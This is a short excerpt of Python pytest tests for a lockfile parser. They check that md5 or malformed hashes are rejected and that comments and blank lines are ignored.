def test_parse_rejects_weak_or_malformed_hashes() -> None:
    with pytest.raises(LockfileError, match="sha256"):
        parse_lockfile("foo==1.0 --hash=md5:d41d8cd98f00b204e9800998ecf8427e\n")
    with pytest.raises(LockfileError, match="sha256"):
        parse_lockfile("foo==1.0 --hash=sha256:not-hex\n")


def test_parse_ignores_comments_and_blank_lines() -> None:
    text = (
        "# foo @ https://commented.example/x.whl\n"
        "\n"
        f"foo==1.0  # trailing comment with ://\n"
        f"    {H1}\n"
    )
    (req,) = parse_lockfile(text)
    assert req.spec == "foo==1.0"
    assert req.hashes == ("sha256:" + "0" * 64,)


